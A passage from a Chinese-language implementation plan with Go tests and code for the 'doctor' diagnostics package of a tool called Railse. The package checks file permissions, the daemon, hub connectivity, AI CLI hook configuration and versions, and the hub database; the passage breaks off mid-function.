Expected: 全过。本机手工：`go run ./cmd/railse setup autostart --dry-run` 打印 plist 与两条 launchctl 命令。

- [ ] **Step 5: 提交**

```bash
git add cmd/railse/autostart.go cmd/railse/autostart_test.go cmd/railse/setup.go
git commit -m "feat(setup): autostart 用 launchd 或 systemd 托管守护进程与 hub"
```

---

### Task 6: `internal/doctor`：检查项与报告

**Files:**
- Create: `internal/doctor/doctor.go`（类型、`Options`、`Run`）
- Create: `internal/doctor/agent.go`（目录与文件权限、守护进程在跑、开机自启）
- Create: `internal/doctor/hooks.go`（三个 CLI 的钩子）
- Create: `internal/doctor/cli.go`（CLI 版本）
- Create: `internal/doctor/hub.go`（机器侧 hub 可达；hub 侧数据库、密码、VAPID、ACME 目录）
- Create: `internal/doctor/report.go`（文本与 JSON 输出）
- Create: `internal/doctor/doctor_test.go`
- Modify: `internal/hub/store/store.go`（导出 `SchemaVersion`）

**Interfaces:**（包 `doctor`）
- `type Status string`；常量 `OK = "ok"`、`Warn = "warn"`、`Fail = "fail"`、`Skip = "skip"`
- `type Check struct{ ID, Name string; Status Status; Detail, Hint string }`
- `type Report struct{ Version string; Checks []Check }`；`func (r Report) Failed() bool`；`func (r Report) Write(w io.Writer)`（每行 `[ok]`/`[warn]`/`[fail]`/`[skip]` 加名称与细节，失败与警告下一行缩进“修复：”；末尾汇总 `n 项通过，n 项警告，n 项失败，n 项跳过`）；`func (r Report) JSON() ([]byte, error)`
- `type Options struct{ AgentDir, Project, HubDir, Bin, Version, Home, GOOS string; LookPath func(string) (string, error); RunCmd func(name string, args ...string) (string, error); HTTP *http.Client; AgentStatus func(socket string) (proto.Status, error); Now time.Time }`：零值字段由 `Run` 填默认（`exec.LookPath`、`exec.Command` 合并输出、10 秒的 `http.Client`、经 `hookclient` 问守护进程、`time.Now()`）
- `func Run(o Options) Report`：按顺序跑 `agentChecks`、`hubClientChecks`、`hookChecks`、`cliChecks`、`hubServerChecks`；`Project` 为空跳过钩子检查（`skip`），`HubDir` 为空跳过 hub 侧
- 检查项（`ID` 固定，文案中文）：
  - `agent.dir`：数据目录存在且 0700
  - `agent.files`：`rules.yaml`、`machine.json`、`audit.jsonl`、`state.json`（存在的）都是 0600
  - `agent.socket`：`agent.sock` 存在、是 socket、0600
  - `agent.running`：`AgentStatus` 成功 → ok，细节 `规则 N 条，待决 N，暂停 …，hub …`；失败 → fail，提示 `railse agent run` 或 `railse setup autostart`
  - `agent.hub`：`hub` 为 `disabled` → fail（提示 `railse agent enroll --force`）；`connecting` → warn；`connected` → ok；`none` → warn“未接入 hub，引擎定不了的请求会交回终端”
  - `agent.autostart`：按 `GOOS` 看 plist 或用户单元文件是否存在 → ok/warn
  - `hub.reachable`：`machine.json` 存在时 `GET <hub_url>/api/version` → 200 且 `agent_proto == wire.Proto` → ok（细节带 hub 版本）；协议不同 → fail“hub 协议 X，本机 Y，请升级较旧的一方”；连不上 → fail；没有 machine.json → skip
  - `hooks.claude`、`hooks.codex`、`hooks.gemini`：配置文件存在且 `hooksconf.Inspect` 对 `hooksconf.Expected(cli)` 的每个事件 `Present` 且 `Timeout >= 下限` → ok；缺事件或超时不够 → fail（细节列出缺哪个、超时多少，提示 `railse setup hooks --project …`）；文件不存在 → fail；JSON 坏 → fail；Claude 的本机与共享配置都有我们的条目 → warn“settings.json 与 settings.local.json 都装了，钩子会触发两次，运行 railse setup hooks 迁走”；`Bin` 非空且条目程序路径与之不同 → warn“钩子指向 X，当前程序是 Y”
  - `hooks.codex_notify`：`~/.codex/config.toml` 里有 `notify = [... "hook", "codex-notify"]`（正则 `(?m)^\s*notify\s*=\s*\[.*"hook"\s*,\s*"codex-notify"`）→ ok，否则 warn
  - `cli.claude`、`cli.codex`、`cli.gemini`：`LookPath` 找不到 → skip；`RunCmd(path, "--version")` 取 `\d+\.\d+\.\d+`；Gemini 低于 `0.65.0` → fail“钩子在 0.65.0 之前无法在审批前拦截”；Claude 不是 `2.1.280`、Codex 不是 `0.145.0` → warn“钩子格式按 X 录制，当前 Y 未验证”（版本常量放 `cli.go`：`const sampleClaude = "2.1.280"`、`sampleCodex = "0.145.0"`、`minGemini = "0.65.0"`）
  - `hubsrv.dir`、`hubsrv.db`：hub 目录 0700；`hub.db` 存在且 0600；以只读方式打开（`sql.Open("sqlite", "file:…?mode=ro")`）读 `schema_version` 等于 `store.SchemaVersion` → ok，比程序新或旧 → fail/warn；`settings` 里 `password_hash` 有 → ok 否则 warn“还没设密码：railse hub password”；`vapid_private` 有则 base64url 解码并 `push.ParseVAPID` → ok，坏了 → fail“VAPID 密钥损坏，hub 起不来：railse hub vapid --rotate 重建”（这就是第 4 份要的诊断）；`acme/` 存在时 0700 → ok
  - `hubsrv.autostart`：plist 或单元存在 → ok/warn

- [ ] **Step 1: 写失败的测试**

`internal/doctor/doctor_test.go`（节选关键用例，其余按同样写法覆盖每个检查项）:
```go
package doctor

import (
	"encoding/base64"
	"encoding/json"
	"errors"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/railse/railse-opc/internal/hooksconf"
	"github.com/railse/railse-opc/internal/hub/push"
	"github.com/railse/railse-opc/internal/hub/store"
	"github.com/railse/railse-opc/internal/hub/wire"
	"github.com/railse/railse-opc/internal/proto"
)

func find(t *testing.T, r Report, id string) Check {
	t.Helper()
	for _, c := range r.Checks {
		if c.ID == id {
			return c
		}
	}
	t.Fatalf("没有检查项 %s", id)
	return Check{}
}

func fakeOpts(t *testing.T) (Options, string) {
	t.Helper()
	base, _ := os.MkdirTemp("", "rs")
	t.Cleanup(func() { os.RemoveAll(base) })
	home := filepath.Join(base, "home")
	agentDir := filepath.Join(home, ".railse")
	os.MkdirAll(agentDir, 0o700)
	os.WriteFile(filepath.Join(agentDir, "rules.yaml"), []byte("version: 1\nrules: []\n"), 0o600)
	l, _ := net.Listen("unix", filepath.Join(agentDir, "agent.sock"))
	t.Cleanup(func() { l.Close() })
	os.Chmod(filepath.Join(agentDir, "agent.sock"), 0o600)
	return Options{
		AgentDir: agentDir, Home: home, GOOS: "darwin", Version: "1.0.0", Now: time.Now(),
		LookPath:    func(string) (string, error) { return "", errors.New("not found") },
		RunCmd:      func(string, ...string) (string, error) { return "", nil },
		AgentStatus: func(string) (proto.Status, error) { return proto.Status{Rules: 2, Hub: "none"}, nil },
	}, home
}

func TestAgentChecksHappyAndPermissions(t *testing.T) {
	o, _ := fakeOpts(t)
	r := Run(o)
	for _, id := range []string{"agent.dir", "agent.files", "agent.socket", "agent.running"} {
		if c := find(t, r, id); c.Status != OK {
			t.Fatalf("%s = %+v", id, c)
		}
	}
	if c := find(t, r, "agent.hub"); c.Status != Warn || !strings.Contains(c.Detail, "未接入") {
		t.Fatalf("agent.hub = %+v", c)
	}
	if c := find(t, r, "hooks.claude"); c.Status != Skip {
		t.Fatalf("没给 Project 应 skip: %+v", c)
	}
	os.Chmod(filepath.Join(o.AgentDir, "rules.yaml"), 0o644)
	os.Chmod(o.AgentDir, 0o755)
	r = Run(o)
	if c := find(t, r, "agent.files"); c.Status != Fail || !strings.Contains(c.Detail, "rules.yaml") || !strings.Contains(c.Hint, "chmod 600") {
		t.Fatalf("权限检查: %+v", c)
	}
	if c := find(t, r, "agent.dir"); c.Status != Fail {
		t.Fatalf("目录权限: %+v", c)
	}
	if !r.Failed() {
		t.Fatal("应标记失败")
	}
}

func TestAgentNotRunning(t *testing.T) {
	o, _ := fakeOpts(t)
	o.AgentStatus = func(string) (proto.Status, error) { return proto.Status{}, errors.New("connect: no such file") }
	r := Run(o)
	if c := find(t, r, "agent.running"); c.Status != Fail || !strings.Contains(c.Hint, "railse agent run") {
		t.Fatalf("%+v", c)
	}
}

func TestHubReachableAndProto(t *testing.T) {
	o, _ := fakeOpts(t)
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/api/version" {
			http.NotFound(w, r)
			return
		}
		json.NewEncoder(w).Encode(map[string]any{"version": "1.0.0", "agent_proto": wire.Proto})
	}))
	defer srv.Close()
	os.WriteFile(filepath.Join(o.AgentDir, "machine.json"), []byte(`{"hub_url":"`+srv.URL+`","machine_id":"m","secret":"s","name":"mac"}`), 0o600)
	o.AgentStatus = func(string) (proto.Status, error) { return proto.Status{Hub: "connected", HubURL: srv.URL}, nil }
	r := Run(o)
	if c := find(t, r, "hub.reachable"); c.Status != OK || !strings.Contains(c.Detail, "1.0.0") {
		t.Fatalf("%+v", c)
	}
	if c := find(t, r, "agent.hub"); c.Status != OK {
		t.Fatalf("%+v", c)
	}
	srv.Close()
	r = Run(o)
	if c := find(t, r, "hub.reachable"); c.Status != Fail {
		t.Fatalf("连不上应 fail: %+v", c)
	}
	o.AgentStatus = func(string) (proto.Status, error) { return proto.Status{Hub: "disabled", HubURL: srv.URL}, nil }
	if c := find(t, Run(o), "agent.hub"); c.Status != Fail || !strings.Contains(c.Hint, "enroll --force") {
		t.Fatalf("%+v", c)
	}
}

func TestHookChecks(t *testing.T) {
	o, home := fakeOpts(t)
	proj := filepath.Join(home, "proj")
	bin := "/usr/local/bin/railse"
	o.Project, o.Bin = proj, bin
	local, shared := hooksconf.ClaudePaths(proj)
	os.MkdirAll(filepath.Dir(local), 0o755)
	doc, _ := hooksconf.Merge(nil, bin, hooksconf.Plan("claude", bin))
	os.WriteFile(local, doc, 0o644)
	os.MkdirAll(filepath.Dir(hooksconf.GeminiPath(proj)), 0o755)
	gdoc, _ := hooksconf.Merge(nil, bin, hooksconf.Plan("gemini", bin))
	os.WriteFile(hooksconf.GeminiPath(proj), gdoc, 0o644)
	r := Run(o)
	if c := find(t, r, "hooks.claude"); c.Status != OK {
		t.Fatalf("claude: %+v", c)
	}
	if c := find(t, r, "hooks.gemini"); c.Status != OK {
		t.Fatalf("gemini: %+v", c)
	}
	if c := find(t, r, "hooks.codex"); c.Status != Fail || !strings.Contains(c.Hint, "setup hooks") {
		t.Fatalf("codex 未装应 fail: %+v", c)
	}
	// 超时不够
	bad := strings.Replace(string(doc), `"timeout": 86400`, `"timeout": 60`, 1)
	os.WriteFile(local, []byte(bad), 0o644)
	if c := find(t, Run(o), "hooks.claude"); c.Status != Fail || !strings.Contains(c.Detail, "PermissionRequest") {
		t.Fatalf("超时不够: %+v", c)
	}
	// 两处都装了
	os.WriteFile(local, doc, 0o644)
	os.WriteFile(shared, doc, 0o644)
	if c := find(t, Run(o), "hooks.claude"); c.Status != Warn || !strings.Contains(c.Detail, "两次") {
		t.Fatalf("两处都装: %+v", c)
	}
	os.Remove(shared)
	// 指向别的程序
	o.Bin = "/opt/new/railse"
	if c := find(t, Run(o), "hooks.claude"); c.Status != Warn || !strings.Contains(c.Detail, "/usr/local/bin/railse") {
		t.Fatalf("程序路径不同: %+v", c)
	}
	// codex notify
	os.MkdirAll(filepath.Join(home, ".codex"), 0o755)
	os.WriteFile(filepath.Join(home, ".codex", "config.toml"), []byte("model = \"x\"\nnotify = [\"/usr/local/bin/railse\", \"hook\", \"codex-notify\"]\n"), 0o644)
	if c := find(t, Run(o), "hooks.codex_notify"); c.Status != OK {
		t.Fatalf("notify: %+v", c)
	}
}

func TestCLIVersions(t *testing.T) {
	o, _ := fakeOpts(t)
	o.LookPath = func(name string) (string, error) { return "/bin/" + name, nil }
	o.RunCmd = func(name string, args ...string) (string, error) {
		switch filepath.Base(name) {
		case "claude":
			return "2.1.280 (Claude Code)\n", nil
		case "codex":
			return "codex-cli 0.150.0\n", nil
		case "gemini":
			return "0.60.0\n", nil
		}
		return "", errors.New("no")
	}
	r := Run(o)
	if c := find(t, r, "cli.claude"); c.Status != OK {
		t.Fatalf("claude: %+v", c)
	}
	if c := find(t, r, "cli.codex"); c.Status != Warn || !strings.Contains(c.Detail, "0.145.0") {
		t.Fatalf("codex 版本不同应 warn: %+v", c)
	}
	if c := find(t, r, "cli.gemini"); c.Status != Fail || !strings.Contains(c.Detail, "0.65.0") {
		t.Fatalf("gemini 太旧应 fail: %+v", c)
	}
	o.LookPath = func(string) (string, error) { return "", errors.New("nope") }
	if c := find(t, Run(o), "cli.claude"); c.Status != Skip {
		t.Fatalf("没装应 skip: %+v", c)
	}
}

func TestHubServerChecks(t *testing.T) {
	o, home := fakeOpts(t)
	hubDir := filepath.Join(home, ".railse-hub")
	os.MkdirAll(hubDir, 0o700)
	st, err := store.Open(filepath.Join(hubDir, "hub.db"))
	if err != nil {
		t.Fatal(err)
	}
	v, _ := push.GenerateVAPID()
	st.SetSetting("vapid_private", base64.RawURLEncoding.EncodeToString(v.Raw()))
	st.Close()
	o.HubDir = hubDir
	r := Run(o)
	if c := find(t, r, "hubsrv.db"); c.Status != OK {
		t.Fatalf("db: %+v", c)
	}
	if c := find(t, r, "hubsrv.password"); c.Status != Warn || !strings.Contains(c.Hint, "hub password") {
		t.Fatalf("没设密码: %+v", c)
	}
	if c := find(t, r, "hubsrv.vapid"); c.Status != OK {
		t.Fatalf("vapid: %+v", c)
	}
	// VAPID 损坏
	st, _ = store.Open(filepath.Join(hubDir, "hub.db"))
	st.SetSetting("vapid_private", "not-base64!!")
	st.Close()
	if c := find(t, Run(o), "hubsrv.vapid"); c.Status != Fail || !strings.Contains(c.Hint, "vapid --rotate") {
		t.Fatalf("坏 VAPID: %+v", c)
	}
	// 没有 HubDir：整段 skip
	o.HubDir = ""
	if c := find(t, Run(o), "hubsrv.db"); c.Status != Skip {
		t.Fatalf("%+v", c)
	}
}

func TestReportOutput(t *testing.T) {
	r := Report{Version: "1.0.0", Checks: []Check{{ID: "a", Name: "甲", Status: OK, Detail: "好"}, {ID: "b", Name: "乙", Status: Fail, Detail: "坏", Hint: "修它"}, {ID: "c", Name: "丙", Status: Skip}}}
	var b strings.Builder
	r.Write(&b)
	out := b.String()
	for _, want := range []string{"[ok]", "甲", "[fail]", "乙", "修复：修它", "[skip]", "1 项通过，0 项警告，1 项失败，1 项跳过"} {
		if !strings.Contains(out, want) {
			t.Fatalf("缺 %q:\n%s", want, out)
		}
	}
	j, _ := r.JSON()
	var back Report
	if json.Unmarshal(j, &back) != nil || len(back.Checks) != 3 || back.Checks[1].Hint != "修它" {
		t.Fatalf("JSON: %s", j)
	}
}
```

- [ ] **Step 2: 跑测试确认失败**

Run: `go test ./internal/doctor/`
Expected: FAIL，包不存在。

- [ ] **Step 3: 写实现**

`internal/hub/store/store.go`：`const schemaVersion = 2` 改为导出 `const SchemaVersion = 2`（包内引用同步改）。

`internal/doctor/doctor.go`:
```go
// Package doctor 只读地检查一台机器上 Railse 的安装：守护进程、hub 连接、三个 CLI 的钩子与版本、权限；
// 在 hub 机器上还检查数据库、密码与推送密钥。不改任何东西。
package doctor

import (
	"net/http"
	"os/exec"
	"runtime"
	"time"

	"github.com/railse/railse-opc/internal/hookclient"
	"github.com/railse/railse-opc/internal/proto"
)

// Status 是一项检查的结果。
type Status string

const (
	OK   Status = "ok"
	Warn Status = "warn"
	Fail Status = "fail"
	Skip Status = "skip"
)

// Check 是一项检查。
type Check struct {
	ID     string `json:"id"`
	Name   string `json:"name"`
	Status Status `json:"status"`
	Detail string `json:"detail,omitempty"`
	Hint   string `json:"hint,omitempty"`
}

// Report 是一次 doctor 的全部结果。
type Report struct {
	Version string  `json:"version"`
	Checks  []Check `json:"checks"`
}

// Failed 报告是否有 fail。
func (r Report) Failed() bool {
	for _, c := range r.Checks {
		if c.Status == Fail {
			return true
		}
	}
	return false
}

// Options 是检查的输入；函数型字段为空时用真实实现。
type Options struct {
	AgentDir string // 守护进程数据目录
	Project  string // 项目目录（钩子检查）；空则跳过
	HubDir   string // hub 数据目录；空则跳过 hub 侧
	Bin      string // railse 可执行文件；用于比对钩子里的程序路径，空则只按文件名认
	Version  string
	Home     string
	GOOS     string

	LookPath    func(file string) (string, error)
	RunCmd      func(name string, args ...string) (string, error)
	HTTP        *http.Client
	AgentStatus func(socket string) (proto.Status, error)
	Now         time.Time
}

func (o *Options) defaults() {
	if o.GOOS == "" {
		o.GOOS = runtime.GOOS
	}
	if o.LookPath == nil {
		o.LookPath = exec.LookPath
	}
	if o.RunCmd == nil {
		o.RunCmd = func(name string, args ...string) (string, error) {
			out, err := exec.Command(name, args...).CombinedOutput()
			return string(out), err
		}
	}
	if o.HTTP == nil {
		o.HTTP = &http.Client{Timeout: 10 * time.Second}
	}
	if o.AgentStatus == nil {
		o.AgentStatus = func(socket string) (proto.Status, error) {
			reply, err := hookclient.Client{SocketPath: socket, ConnectTimeout: 2 * time.Second}.Control("status")
			if err != nil {
				return proto.Status{}, err
			}
			if !reply.OK || reply.Status == nil {
				return proto.Status{}, errorf("守护进程答复失败: %s", reply.Error)
			}
			return *reply.Status, nil
		}
	}
	if o.Now.IsZero() {
		o.Now = time.Now()
	}
}

// Run 跑全部检查。
func Run(o Options) Report {
	o.defaults()
	r := Report{Version: o.Version}
	r.Checks = append(r.Checks, agentChecks(o)...)
	r.Checks = append(r.Checks, hubClientChecks(o)...)
	r.Checks = append(r.Checks, hookChecks(o)...)
	r.Checks = append(r.Checks, cliChecks(o)...)
	r.Checks = append(r.Checks, hubServerChecks(o)...)
	return r
}
```
（`errorf` 是 `fmt.Errorf` 的别名，放在 `report.go`。）

`internal/doctor/agent.go`:
```go
package doctor

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

func permCheck(id, name, path string, want os.FileMode, dir bool) Check {
	st, err := os.Lstat(path)
	if err != nil {
		return Check{ID: id, Name: name, Status: Fail, Detail: fmt.Sprintf("%s 不存在", path), Hint: "先运行 railse agent run 一次，它会建好目录与文件"}
	}
	if dir && !st.IsDir() {
		return Check{ID: id, Name: name, Status: Fail, Detail: path + " 不是目录"}
	}
	if st.Mode().Perm() != want {
		return Check{ID: id, Name: name, Status: Fail, Detail: fmt.Sprintf("%s 权限是 %04o，应为 %04o", path, st.Mode().Perm(), want), Hint: fmt.Sprintf("chmod %o %s", want, path)}
	}
	return Check{ID: id, Name: name, Status: OK, Detail: path}
}

func agentChecks(o Options) []Check {
	var out []Check
	out = append(out, permCheck("agent.dir", "守护进程数据目录", o.AgentDir, 0o700, true))
	var bad []string
	for _, f := range []string{"rules.yaml", "machine.json", "audit.jsonl", "state.json"} {
		p := filepath.Join(o.AgentDir, f)
		st, err := os.Lstat(p)
		if err != nil {
			continue
		}
		if st.Mode().Perm() != 0o600 {
			bad = append(bad, fmt.Sprintf("%s(%04o)", f, st.Mode().Perm()))
		}
	}
	if len(bad) > 0 {
		out = append(out, Check{ID: "agent.files", Name: "配置与审计文件权限", Status: Fail, Detail: "不是 0600：" + strings.Join(bad, "、"), Hint: "chmod 600 " + filepath.Join(o.AgentDir, "{rules.yaml,machine.json,audit.jsonl,state.json}")})
	} else {
		out = append(out, Check{ID: "agent.files", Name: "配置与审计文件权限", Status: OK})
	}
	sock := filepath.Join(o.AgentDir, "agent.sock")
	if st, err := os.Lstat(sock); err != nil {
		out = append(out, Check{ID: "agent.socket", Name: "socket 文件", Status: Fail, Detail: sock + " 不存在（守护进程没在跑）", Hint: "railse agent run，或 railse setup autostart"})
	} else if st.Mode()&os.ModeSocket == 0 {
		out = append(out, Check{ID: "agent.socket", Name: "socket 文件", Status: Fail, Detail: sock + " 不是 socket", Hint: "移走这个文件后重启守护进程"})
	} else if st.Mode().Perm() != 0o600 {
		out = append(out, Check{ID: "agent.socket", Name: "socket 文件", Status: Fail, Detail: fmt.Sprintf("权限 %04o，应为 0600", st.Mode().Perm()), Hint: "chmod 600 " + sock})
	} else {
		out = append(out, Check{ID: "agent.socket", Name: "socket 文件", Status: OK, Detail: sock})
	}
	st, err := o.AgentStatus(sock)
	if err != nil {
		out = append(out, Check{ID: "agent.running", Name: "守护进程在跑", Status: Fail, Detail: err.Error(), Hint: "railse agent run（前台）或 railse setup autostart（开机自启）"})
		out = append(out, Check{ID: "agent.hub", Name: "hub 连接", Status: Skip, Detail: "守护进程没在跑"})
	} else {
		paused := "未暂停"
		if st.Paused {
			paused = "已暂停"
		}
		out = append(out, Check{ID: "agent.running", Name: "守护进程在跑", Status: OK, Detail: fmt.Sprintf("规则 %d 条，待决 %d，%s，hub %s", st.Rules, st.Pending, paused, st.Hub)})
		switch st.Hub {
		case "connected":
			out = append(out, Check{ID: "agent.hub", Name: "hub 连接", Status: OK, Detail: st.HubURL})
		case "connecting":
			out = append(out, Check{ID: "agent.hub", Name: "hub 连接", Status: Warn, Detail: "正在重连 " + st.HubURL, Hint: "看 agent.log 里的“hub 连接结束”原因；网络或 hub 没起来时都会这样"})
		case "disabled":
			out = append(out, Check{ID: "agent.hub", Name: "hub 连接", Status: Fail, Detail: st.HubURL + " 以 401 拒绝了本机密钥", Hint: "railse agent enroll --hub … --token … --force 后重启守护进程"})
		default:
			out = append(out, Check{ID: "agent.hub", Name: "hub 连接", Status: Warn, Detail: "未接入 hub，引擎定不了的请求会交回终端", Hint: "railse agent enroll --hub https://… --token …"})
		}
	}
	out = append(out, autostartCheck("agent.autostart", "守护进程开机自启", o, "agent"))
	return out
}

// autostartCheck 只看托管文件是否存在：不跑 launchctl/systemctl。
func autostartCheck(id, name string, o Options, kind string) Check {
	var path string
	switch o.GOOS {
	case "darwin":
		path = filepath.Join(o.Home, "Library", "LaunchAgents", "dev.railse."+kind+".plist")
	case "linux":
		path = filepath.Join(o.Home, ".config", "systemd", "user", "railse-"+kind+".service")
		if _, err := os.Stat(filepath.Join("/etc/systemd/system", "railse-"+kind+".service")); err == nil {
			return Check{ID: id, Name: name, Status: OK, Detail: "系统单元 /etc/systemd/system/railse-" + kind + ".service"}
		}
	default:
		return Check{ID: id, Name: name, Status: Skip, Detail: "不支持的系统"}
	}
	if _, err := os.Stat(path); err != nil {
		flag := ""
		if kind == "hub" {
			flag = "--hub "
		}
		return Check{ID: id, Name: name, Status: Warn, Detail: "没有托管文件 " + path, Hint: "railse setup autostart " + flag + "让它开机自启、崩溃自动拉起"}
	}
	return Check{ID: id, Name: name, Status: OK, Detail: path}
}
```

`internal/doctor/hub.go`:
```go
package doctor

import (
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	_ "modernc.org/sqlite"

	"github.com/railse/railse-opc/internal/hub/push"
	"github.com/railse/railse-opc/internal/hub/store"
	"github.com/railse/railse-opc/internal/hub/wire"
)

// hubClientChecks 在机器侧看 hub 是否可达、协议是否一致。
func hubClientChecks(o Options) []Check {
	b, err := os.ReadFile(filepath.Join(o.AgentDir, "machine.json"))
	if err != nil {
		return []Check{{ID: "hub.reachable", Name: "hub 可达", Status: Skip, Detail: "没有 machine.json（未接入 hub）"}}
	}
	var m struct {
		HubURL string `json:"hub_url"`
	}
	if json.Unmarshal(b, &m) != nil || m.HubURL == "" {
		return []Check{{ID: "hub.reachable", Name: "hub 可达", Status: Fail, Detail: "machine.json 损坏", Hint: "railse agent enroll --force 重新接入"}}
	}
	resp, err := o.HTTP.Get(strings.TrimRight(m.HubURL, "/") + "/api/version")
	if err != nil {
		return []Check{{ID: "hub.reachable", Name: "hub 可达", Status: Fail, Detail: err.Error(), Hint: "确认 hub 在跑、域名与端口对、这台机器能访问它"}}
	}
	defer resp.Body.Close()
	var v struct {
		Version    string `json:"version"`
		AgentProto int    `json:"agent_proto"`
	}
	if resp.StatusCode != 200 || json.NewDecoder(resp.Body).Decode(&v) != nil {
		return []Check{{ID: "hub.reachable", Name: "hub 可达", Status: Fail, Detail: fmt.Sprintf("%s/api/version 回 %d", m.HubURL, resp.StatusCode), Hint: "hub 版本太旧（没有 /api/version）或地址指向了别的服务"}}
	}
	if v.AgentProto != wire.Proto {
		return []Check{{ID: "hub.reachable", Name: "hub 可达", Status: Fail, Detail: fmt.Sprintf("hub 协议 %d，本机 %d（hub 版本 %s，本机 %s）", v.AgentProto, wire.Proto, v.Version, o.Version), Hint: "升级较旧的一方到同一版本"}}
	}
	return []Check{{ID: "hub.reachable", Name: "hub 可达", Status: OK, Detail: fmt.Sprintf("%s，hub 版本 %s", m.HubURL, v.Version)}}
}

// hubServerChecks 在 hub 机器上看数据目录、数据库、密码与推送密钥。只读打开数据库，不跑迁移。
func hubServerChecks(o Options) []Check {
	skip := func() []Check {
		var out []Check
		for _, id := range []string{"hubsrv.dir", "hubsrv.db", "hubsrv.password", "hubsrv.vapid", "hubsrv.autostart"} {
			out = append(out, Check{ID: id, Name: "hub：" + id, Status: Skip, Detail: "这台机器没有 hub 数据目录"})
		}
		return out
	}
	if o.HubDir == "" {
		return skip()
	}
	if _, err := os.Stat(o.HubDir); err != nil {
		return skip()
	}
	var out []Check
	out = append(out, permCheck("hubsrv.dir", "hub 数据目录", o.HubDir, 0o700, true))
	dbPath := filepath.Join(o.HubDir, "hub.db")
	dbCheck := permCheck("hubsrv.db", "hub 数据库", dbPath, 0o600, false)
	if dbCheck.Status != OK {
		out = append(out, dbCheck)
		out = append(out, Check{ID: "hubsrv.password", Name: "网页密码", Status: Skip}, Check{ID: "hubsrv.vapid", Name: "推送密钥", Status: Skip})
		out = append(out, autostartCheck("hubsrv.autostart", "hub 开机自启", o, "hub"))
		return out
	}
	db, err := sql.Open("sqlite", "file:"+dbPath+"?mode=ro")
	if err != nil {
		out = append(out, Check{ID: "hubsrv.db", Name: "hub 数据库", Status: Fail, Detail: err.Error()})
		return out
	}
	defer db.Close()
	var v int
	if err := db.QueryRow("SELECT v FROM schema_version").Scan(&v); err != nil {
		out = append(out, Check{ID: "hubsrv.db", Name: "hub 数据库", Status: Fail, Detail: "读不到 schema_version: " + err.Error(), Hint: "数据库损坏或不是 hub.db"})
		return out
	}
	switch {
	case v > store.SchemaVersion:
		out = append(out, Check{ID: "hubsrv.db", Name: "hub 数据库", Status: Fail, Detail: fmt.Sprintf("库版本 %d 比程序（%d）新", v, store.SchemaVersion), Hint: "升级 railse"})
	case v < store.SchemaVersion:
		out = append(out, Check{ID: "hubsrv.db", Name: "hub 数据库", Status: Warn, Detail: fmt.Sprintf("库版本 %d，程序 %d，下次 railse hub run 会自动升级", v, store.SchemaVersion)})
	default:
		out = append(out, Check{ID: "hubsrv.db", Name: "hub 数据库", Status: OK, Detail: fmt.Sprintf("%s，版本 %d", dbPath, v)})
	}
	setting := func(key string) (string, bool) {
		var val string
		err := db.QueryRow("SELECT value FROM settings WHERE key = ?", key).Scan(&val)
		return val, err == nil
	}
	if _, ok := setting("password_hash"); ok {
		out = append(out, Check{ID: "hubsrv.password", Name: "网页密码", Status: OK})
	} else {
		out = append(out, Check{ID: "hubsrv.password", Name: "网页密码", Status: Warn, Detail: "还没设置，网页登录会得到 503", Hint: "railse hub password"})
	}
	if raw, ok := setting("vapid_private"); ok {
		b, err := base64.RawURLEncoding.DecodeString(raw)
		if err == nil {
			_, err = push.ParseVAPID(b)
		}
		if err != nil {
			out = append(out, Check{ID: "hubsrv.vapid", Name: "推送密钥", Status: Fail, Detail: "VAPID 私钥损坏，hub 与 railse hub password 都会起不来", Hint: "railse hub vapid --rotate 重建（所有手机要重新开启通知）"})
		} else {
			out = append(out, Check{ID: "hubsrv.vapid", Name: "推送密钥", Status: OK})
		}
	} else {
		out = append(out, Check{ID: "hubsrv.vapid", Name: "推送密钥", Status: Warn, Detail: "还没生成，首次 railse hub run 会生成"})
	}
	if st, err := os.Stat(filepath.Join(o.HubDir, "acme")); err == nil {
		if st.Mode().Perm() != 0o700 {
			out = append(out, Check{ID: "hubsrv.acme", Name: "ACME 证书目录", Status: Fail, Detail: fmt.Sprintf("权限 %04o，应为 0700", st.Mode().Perm()), Hint: "chmod 700 " + filepath.Join(o.HubDir, "acme")})
		} else {
			out = append(out, Check{ID: "hubsrv.acme", Name: "ACME 证书目录", Status: OK})
		}
	}
	out = append(out, autostartCheck("hubsrv.autostart", "hub 开机自启", o, "hub"))
	return out
}
```
（`hubsrv.vapid --rotate` 需要 Task 2 之后的 `railse hub vapid --rotate` 能在 VAPID 损坏时运行：`RotateVAPID` 不读旧密钥，已满足；但 `cmd/railse/hub.go` 的 `vapid` 子命令若先 `hub.New` 则会失败，确认它直接用 `store`。）

`internal/doctor/hooks.go`:
```go
package doctor

import (
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strings"

	"github.com/railse/railse-opc/internal/hooksconf"
)

var codexNotifyRe = regexp.MustCompile(`(?m)^\s*notify\s*=\s*\[.*"hook"\s*,\s*"codex-notify"`)

func hookChecks(o Options) []Check {
	if o.Project == "" {
		return []Check{
			{ID: "hooks.claude", Name: "Claude Code 钩子", Status: Skip, Detail: "没有指定项目目录（--project）"},
			{ID: "hooks.codex", Name: "Codex 钩子", Status: Skip, Detail: "没有指定项目目录（--project）"},
			{ID: "hooks.codex_notify", Name: "Codex notify", Status: Skip},
			{ID: "hooks.gemini", Name: "Gemini 钩子", Status: Skip, Detail: "没有指定项目目录（--project）"},
		}
	}
	local, shared := hooksconf.ClaudePaths(o.Project)
	out := []Check{hookFileCheck("hooks.claude", "Claude Code 钩子", "claude", local, o)}
	// settings.json 里也有我们的条目：两处都触发
	if b, err := os.ReadFile(shared); err == nil {
		if ins, err := hooksconf.Inspect(b, o.Bin); err == nil && ins.Events["PermissionRequest"].Present {
			c := &out[0]
			if c.Status == OK {
				c.Status = Warn
			}
			c.Detail = strings.TrimSpace(c.Detail + "；settings.json 与 settings.local.json 都装了，钩子会触发两次")
			c.Hint = "railse setup hooks --project " + o.Project + " 会把 settings.json 里的迁走"
		}
	}
	out = append(out, hookFileCheck("hooks.codex", "Codex 钩子", "codex", hooksconf.CodexPath(o.Home), o))
	if b, err := os.ReadFile(filepath.Join(o.Home, ".codex", "config.toml")); err == nil && codexNotifyRe.Match(b) {
		out = append(out, Check{ID: "hooks.codex_notify", Name: "Codex notify", Status: OK})
	} else {
